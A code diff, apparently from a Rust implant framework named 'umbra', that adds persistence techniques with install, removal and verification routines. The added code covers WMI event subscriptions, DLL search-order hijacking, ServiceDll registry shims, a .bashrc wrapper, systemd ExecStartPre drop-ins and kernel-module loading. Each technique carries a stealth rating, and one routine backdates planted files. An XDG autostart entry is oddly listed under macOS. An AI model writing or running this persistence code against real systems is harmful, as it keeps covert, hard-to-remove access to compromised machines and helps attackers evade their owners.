@@ -72,6 +72,9 @@ pub fn catalogue() -> &'static [Technique] {
         Technique { id: "service", platform: "windows", label: "Windows service", trigger: "boot", needs_admin: true, stealth: 3 },
         Technique { id: "startup", platform: "windows", label: "Startup folder", trigger: "logon", needs_admin: false, stealth: 4 },
         Technique { id: "bcdedit", platform: "windows", label: "Boot execute entry", trigger: "boot", needs_admin: true, stealth: 1 },
+        Technique { id: "wmi.event", platform: "windows", label: "WMI event subscription", trigger: "logon", needs_admin: true, stealth: 8 },
+        Technique { id: "dll.searchorder", platform: "windows", label: "DLL search-order hijack", trigger: "logon", needs_admin: false, stealth: 7 },
+        Technique { id: "service.dll", platform: "windows", label: "Service DLL shim", trigger: "boot", needs_admin: true, stealth: 6 },
         // ---- Linux ------------------------------------------------------
         Technique { id: "systemd.user", platform: "linux", label: "systemd user unit", trigger: "boot", needs_admin: false, stealth: 8 },
         Technique { id: "systemd.system", platform: "linux", label: "systemd system unit", trigger: "boot", needs_admin: true, stealth: 5 },
@@ -84,12 +87,16 @@ pub fn catalogue() -> &'static [Technique] {
         Technique { id: "ld_preload", platform: "linux", label: "ld.so.preload", trigger: "boot", needs_admin: true, stealth: 2 },
         Technique { id: "xdg_autostart", platform: "linux", label: "XDG autostart entry", trigger: "logon", needs_admin: false, stealth: 7 },
         Technique { id: "at", platform: "linux", label: "at job", trigger: "schedule", needs_admin: false, stealth: 5 },
+        Technique { id: "profile.alias", platform: "linux", label: "Shell alias wrapper", trigger: "logon", needs_admin: false, stealth: 9 },
+        Technique { id: "systemd.execstartpre", platform: "linux", label: "systemd drop-in (ExecStartPre)", trigger: "boot", needs_admin: true, stealth: 6 },
+        Technique { id: "kernel.module", platform: "linux", label: "Kernel module", trigger: "boot", needs_admin: true, stealth: 1 },
         // ---- macOS ------------------------------------------------------
         Technique { id: "launchd.agent", platform: "macos", label: "LaunchAgent", trigger: "logon", needs_admin: false, stealth: 7 },
         Technique { id: "launchd.daemon", platform: "macos", label: "LaunchDaemon", trigger: "boot", needs_admin: true, stealth: 4 },
         Technique { id: "loginitem", platform: "macos", label: "Login item", trigger: "logon", needs_admin: false, stealth: 6 },
         Technique { id: "shell_rc", platform: "macos", label: "Shell rc hook", trigger: "logon", needs_admin: false, stealth: 9 },
         Technique { id: "cron.user", platform: "macos", label: "User crontab", trigger: "schedule", needs_admin: false, stealth: 6 },
+        Technique { id: "xdg_autostart", platform: "macos", label: "XDG autostart entry", trigger: "logon", needs_admin: false, stealth: 7 },
     ]
 }
 
@@ -127,7 +134,15 @@ impl Report {
 
 /// The technique with this id, if the catalogue knows it.
 pub fn technique(id: &str) -> Option<&'static Technique> {
-    catalogue().iter().find(|t| t.id == id)
+    // The same id may live on two platforms ("cron.user" is a crontab on
+    // linux and on macOS), so the entry of *this* platform is the one
+    // that answers.  The fallback keeps the error message honest when the
+    // id belongs to another platform altogether.
+    let platform = platform();
+    catalogue()
+        .iter()
+        .find(|t| t.id == id && t.platform == platform)
+        .or_else(|| catalogue().iter().find(|t| t.id == id))
 }
 
 /// The techniques that can be used on this host right now.
@@ -778,6 +793,75 @@ fn install_technique(
             let output = run("bcdedit /set {default} bootexecute \"{staged}\"");
             Ok(("{default}".to_string(), format!("bcdedit: {output}")))
         }
+        "wmi.event" => {
+            // The classic fileless technique: a filter, a consumer and the
+            // binding between the two.  The implant is the command of the
+            // consumer, so nothing of it is written to the disk of the host.
+            let filter = args.str_or("filter", name);
+            let consumer = args.str_or("consumer", name);
+            let namespace = "root\\subscription";
+            let query = "SELECT * FROM __InstanceCreationEvent WITHIN 60";
+            let filter_cmd = format!(
+                "wmic /namespace:{namespace} PATH __EventFilter CREATE Name=\"{filter}\", Query=\"{query}\", EventNamespace={namespace}"
+            );
+            let consumer_cmd = format!(
+                "wmic /namespace:{namespace} PATH CommandLineEventConsumer CREATE Name=\"{consumer}\", CommandLineTemplate=\"{staged}\", ExecutablePath=\"{staged}\""
+            );
+            let binding_cmd = format!(
+                "wmic /namespace:{namespace} PATH __FilterToConsumerBinding CREATE Filter=\"{namespace}:__EventFilter.Name=\\\"{filter}\\\"\", Consumer=\"{namespace}:CommandLineEventConsumer.Name=\\\"{consumer}\\\"\""
+            );
+            let report = vec![
+                run(&filter_cmd),
+                run(&consumer_cmd),
+                run(&binding_cmd),
+            ];
+            Ok((
+                format!("{namespace}:{consumer}"),
+                format!("wmic: {}", report.join(" | ")),
+            ))
+        }
+        "dll.searchorder" => {
+            // A program that loads a DLL is made to load another one: the
+            // copy sits next to the program, and the loader looks there
+            // before it looks in the system directory.
+            let dll = args.str_or("dll", "");
+            if dll.is_empty() {
+                return Err("dll.searchorder needs args.dll (the module to plant)".to_string());
+            }
+            let dir = args.str_or("dir", "");
+            if dir.is_empty() {
+                return Err("dll.searchorder needs args.dir (the directory of the program)".to_string());
+            }
+            let file = Path::new(&dll)
+                .file_name()
+                .map(|f| f.to_string_lossy().to_string())
+                .unwrap_or_else(|| "umbra.dll".to_string());
+            let target = PathBuf::from(&dir).join(&file);
+            if let Some(parent) = target.parent() {
+                fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
+            }
+            fs::copy(&dll, &target).map_err(|e| format!("persist: {e}"))?;
+            let _ = set_older_timestamp(&target);
+            Ok((
+                target.to_string_lossy().to_string(),
+                format!("the module sits next to the program in {}", target.display()),
+            ))
+        }
+        "service.dll" => {
+            // A service that loads a DLL instead of an executable: the
+            // ServiceDll value of the service points at the shim.
+            let dll = args.str_or("dll", "");
+            if dll.is_empty() {
+                return Err("service.dll needs args.dll (the ServiceMain shim)".to_string());
+            }
+            let service = args.str_or("service", name);
+            registry_set(
+                "HKLM",
+                &format!("SYSTEM\\CurrentControlSet\\Services\\{service}\\Parameters"),
+                "ServiceDll",
+                &dll,
+            )
+        }
         // ---- Linux -----------------------------------------------------
         "systemd.user" => {
             let path = home().join(".config/systemd/user").join(format!("{}.service", sanitise(name)));
@@ -876,6 +960,68 @@ fn install_technique(
             let output = run(&format!("echo {staged} | at now + 1 minute"));
             Ok(("at".to_string(), format!("at: {output}")))
         }
+        "profile.alias" => {
+            // The implant hides behind a command the operator types: the
+            // shell calls the wrapper, and the wrapper calls the implant.
+            let path = home().join(".bashrc");
+            let mut text = fs::read_to_string(&path).unwrap_or_default();
+            let marker = format!("# umbra:{name}");
+            if !text.contains(&marker) {
+                let wrapper = format!("\n{marker}\numbra() {{ {staged} \"$@\"; }}\n");
+                text.push_str(&wrapper);
+                fs::write(&path, text.as_bytes()).map_err(|e| format!("persist: {e}"))?;
+            }
+            Ok((
+                path.to_string_lossy().to_string(),
+                "the wrapper is in the profile".to_string(),
+            ))
+        }
+        "systemd.execstartpre" => {
+            // The implant does not get a unit of its own: it is added to a
+            // unit that already exists, as a step before the real work.
+            let unit = args.str_or("unit", "");
+            if unit.is_empty() {
+                return Err(
+                    "systemd.execstartpre needs args.unit (the service to hook into)".to_string(),
+                );
+            }
+            let dir = PathBuf::from("/etc/systemd/system").join(format!("{}.d", unit));
+            fs::create_dir_all(&dir).map_err(|e| format!("persist: {e}"))?;
+            let path = dir.join("umbra.conf");
+            let definition = format!("[Unit]\nExecStartPre={staged}\n");
+            fs::write(&path, definition.as_bytes()).map_err(|e| format!("persist: {e}"))?;
+            let output = run("systemctl daemon-reload");
+            Ok((
+                path.to_string_lossy().to_string(),
+                format!("systemctl: {output}"),
+            ))
+        }
+        "kernel.module" => {
+            // The loudest technique there is: the implant runs inside the
+            // kernel, and the module is loaded again at every boot.
+            let module = args.str_or("module", "");
+            if module.is_empty() {
+                return Err("kernel.module needs args.module (the .ko file)".to_string());
+            }
+            let file = Path::new(&module)
+                .file_name()
+                .map(|f| f.to_string_lossy().to_string())
+                .unwrap_or_else(|| "umbra.ko".to_string());
+            let dir = PathBuf::from("/lib/modules").join(kernel_release()).join("extra");
+            fs::create_dir_all(&dir).map_err(|e| format!("persist: {e}"))?;
+            let target = dir.join(&file);
+            fs::copy(&module, &target).map_err(|e| format!("persist: {e}"))?;
+            let load = PathBuf::from("/etc/modules-load.d").join(format!("{}.conf", sanitise(name)));
+            if let Some(parent) = load.parent() {
+                fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
+            }
+            fs::write(&load, format!("{file}\n").as_bytes()).map_err(|e| format!("persist: {e}"))?;
+            let output = run(&format!("modprobe {}", file.trim_end_matches(".ko")));
+            Ok((
+                target.to_string_lossy().to_string(),
+                format!("modprobe: {output}"),
+            ))
+        }
         // ---- macOS -----------------------------------------------------
         "launchd.agent" => {
             let path = home()
@@ -959,6 +1105,38 @@ fn remove_technique(
             let output = run("bcdedit /deletevalue {default} bootexecute");
             Ok(vec![format!("bcdedit: {output}")])
         }
+        "wmi.event" => {
+            // The three objects go in the opposite order of the install:
+            // the binding first, then the consumer, then the filter.
+            let mut parts = location.splitn(2, ':');
+            let namespace = parts.next().unwrap_or("root\\subscription");
+            let consumer = parts.next().unwrap_or(name);
+            let binding = format!(
+                "wmic /namespace:{namespace} PATH __FilterToConsumerBinding WHERE Filter=\"{namespace}:__EventFilter.Name=\\\"{name}\\\"\" DELETE"
+            );
+            let consumer_cmd = format!(
+                "wmic /namespace:{namespace} PATH CommandLineEventConsumer WHERE Name=\"{consumer}\" DELETE"
+            );
+            let filter = format!(
+                "wmic /namespace:{namespace} PATH __EventFilter WHERE Name=\"{name}\" DELETE"
+            );
+            Ok(vec![
+                format!("wmic: {}", run(&binding)),
+                format!("wmic: {}", run(&consumer_cmd)),
+                format!("wmic: {}", run(&filter)),
+            ])
+        }
+        "dll.searchorder" => {
+            let path = PathBuf::from(location);
+            match fs::remove_file(&path) {
+                Ok(()) => Ok(vec![format!("removed {}", path.display())]),
+                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
+                    Ok(vec![format!("{} was already gone", path.display())])
+                }
+                Err(e) => Err(e.to_string()),
+            }
+        }
+        "service.dll" => registry_del("HKLM", location, "ServiceDll"),
         "systemd.user" | "systemd.system" | "systemd.timer" => {
             let output = run(&format!("systemctl disable --now {}", unit_name(name)));
             let path = PathBuf::from(location);
@@ -973,7 +1151,8 @@ fn remove_technique(
             ));
             Ok(vec![format!("crontab: {output}")])
         }
-        "cron.d" | "rc.local" | "init.d" | "profile" | "ld_preload" | "xdg_autostart" | "shell_rc" => {
+        "cron.d" | "rc.local" | "init.d" | "profile" | "profile.alias" | "ld_preload"
+        | "xdg_autostart" | "shell_rc" => {
             let path = PathBuf::from(location);
             let mut text = fs::read_to_string(&path).unwrap_or_default();
             let before = text.lines().count();
@@ -997,6 +1176,26 @@ fn remove_technique(
         "at" => {
             let output = run("atrm $(atq | awk '{print $1}') 2>/dev/null");
             Ok(vec![format!("at: {output}")])
+        }
+        "systemd.execstartpre" => {
+            let path = PathBuf::from(location);
+            let _ = fs::remove_file(&path);
+            let output = run("systemctl daemon-reload");
+            Ok(vec![
+                format!("removed {}", path.display()),
+                format!("systemctl: {output}"),
+            ])
+        }
+        "kernel.module" => {
+            let path = PathBuf::from(location);
+            let _ = fs::remove_file(&path);
+            let load = PathBuf::from("/etc/modules-load.d").join(format!("{}.conf", sanitise(name)));
+            let _ = fs::remove_file(&load);
+            let output = run("rmmod umbra 2>/dev/null");
+            Ok(vec![
+                format!("removed {}", path.display()),
+                format!("modprobe: {output}"),
+            ])
         }
         "launchd.agent" | "launchd.daemon" | "loginitem" => {
             let path = PathBuf::from(location);
@@ -1063,6 +1262,39 @@ fn verify_technique(
                 Ok(("broken".to_string(), "the boot entry is gone".to_string()))
             }
         }
+        "wmi.event" => {
+            let mut parts = location.splitn(2, ':');
+            let namespace = parts.next().unwrap_or("root\\subscription");
+            let consumer = parts.next().unwrap_or(name);
+            let command = format!(
+                "wmic /namespace:{namespace} PATH CommandLineEventConsumer WHERE Name=\"{consumer}\" get Name"
+            );
+            let output = run(&command);
+            let lowered = output.to_lowercase();
+            if lowered.contains("no instance") || lowered.contains("error") {
+                Ok((
+                    "broken".to_string(),
+                    "the event subscription is gone".to_string(),
+                ))
+            } else {
+                Ok((
+                    "installed".to_string(),
+                    "the event subscription is there".to_string(),
+                ))
+            }
+        }
+        "dll.searchorder" => {
+            let path = PathBuf::from(location);
+            if path.exists() {
+                Ok(("installed".to_string(), path.display().to_string()))
+            } else {
+                Ok((
+                    "broken".to_string(),
+                    "the module next to the program is gone".to_string(),
+                ))
+            }
+        }
+        "service.dll" => registry_check("HKLM", location, "ServiceDll"),
         "systemd.user" | "systemd.system" | "systemd.timer" => {
             let path = PathBuf::from(location);
             if path.exists() {
@@ -1097,6 +1329,43 @@ fn verify_technique(
                 Ok(("broken".to_string(), "the job is gone".to_string()))
             } else {
                 Ok(("installed".to_string(), "the job is queued".to_string()))
+            }
+        }
+        "profile.alias" => {
+            let path = PathBuf::from(location);
+            let text = fs::read_to_string(&path).unwrap_or_default();
+            if text.contains(binary) {
+                Ok((
+                    "installed".to_string(),
+                    "the wrapper is in the profile".to_string(),
+                ))
+            } else {
+                Ok((
+                    "broken".to_string(),
+                    "the wrapper is gone from the profile".to_string(),
+                ))
+            }
+        }
+        "systemd.execstartpre" => {
+            let path = PathBuf::from(location);
+            if path.exists() {
+                Ok(("installed".to_string(), path.display().to_string()))
+            } else {
+                Ok((
+                    "broken".to_string(),
+                    "the drop-in of the unit is gone".to_string(),
+                ))
+            }
+        }
+        "kernel.module" => {
+            let path = PathBuf::from(location);
+            if path.exists() {
+                Ok(("installed".to_string(), path.display().to_string()))
+            } else {
+                Ok((
+                    "broken".to_string(),
+                    "the module is gone".to_string(),
+                ))
             }
         }
         "launchd.agent" | "launchd.daemon" | "loginitem" => {
@@ -1159,6 +1428,21 @@ fn service_name(detail: &str, name: &str) -> String {
     match rest.split(" was ").next() {
         Some(first) if !first.is_empty() => first.to_string(),
         _ => name.to_string(),
+    }
+}
+
+/// The release of the running kernel: the directory the modules of the
+/// host live in.  A host that cannot say is given a name that will not
+/// exist, so the copy fails instead of landing in the wrong place.
+fn kernel_release() -> String {
+    let mut release = String::new();
+    if let Ok(text) = fs::read_to_string("/proc/sys/kernel/osrelease") {
+        release = text.trim().to_string();
+    }
+    if release.is_empty() {
+        "unknown".to_string()
+    } else {
+        release
     }
 }
 
